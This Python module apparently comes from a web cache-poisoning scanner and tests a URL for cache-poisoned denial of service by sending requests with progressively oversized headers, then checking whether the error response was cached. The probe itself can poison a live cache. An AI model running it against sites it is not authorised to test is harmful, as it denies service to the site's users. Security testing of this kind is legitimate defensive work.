#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Header Oversize (HHO)
https://cpdos.org/#HHO
"""

from modules.utils import requests, configure_logger

logger = configure_logger(__name__)

VULN_NAME = "HTTP Header Oversize"

def HHO(url, s, main_status_code, authent):

    logger.debug("Testing for %s vulnerabilities", VULN_NAME)

    cpdos_win = False
    max_i = 50
    i = 0

    big_value = "Big-Value-0"

    while i < max_i:
        big_value = big_value + "0" * 50
        h = {f"X-Oversized-Header-{i}": f"{big_value}"}

        try:
            req_hho = s.get(
                url, headers=h, auth=authent, allow_redirects=False, timeout=10
            )
            logger.debug(
                "STATUS (%s) Headers :(%s)",
                req_hho.status_code,
                h,
            )
            if (
                req_hho.status_code in [400, 413, 500, 502]
                and req_hho.status_code != main_status_code
            ):
                logger.debug(
                    "CPDOS : URL (%s) STATUS (%s) Headers :(%s)",
                    url,
                    req_hho.status_code,
                    req_hho.headers,
                )
                i = 50
                cpdos_win = True
            i += 1

            print(f" \033[34m {VULN_NAME} : X-Oversized-Header-{i}\033[0m\r", end="")
            print("\033[K", end="")

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)

    if cpdos_win:
        try:
            req_hho_verify = s.get(url, auth=authent, allow_redirects=False, timeout=10)
            if (
                req_hho_verify.status_code in [400, 413, 500, 502]
                and req_hho_verify.status_code != main_status_code
            ):
                print(
                    f"  \033[31m └── [VULNERABILITY CONFIRMED]\033[0m | HHO DOS: {url} | \033[34m{main_status_code} > {req_hho_verify.status_code}\033[0m | PAYLOAD: {h}"
                )
            else:
                print(
                    f"  \033[33m└── [INTERESTING BEHAVIOR]\033[0m | HHO DOS: {url} | \033[34m{main_status_code} > {req_hho_verify.status_code}\033[0m | PAYLOAD: {h}"
                )
        except requests.exceptions.ConnectionError as e:
            logger.exception(e)
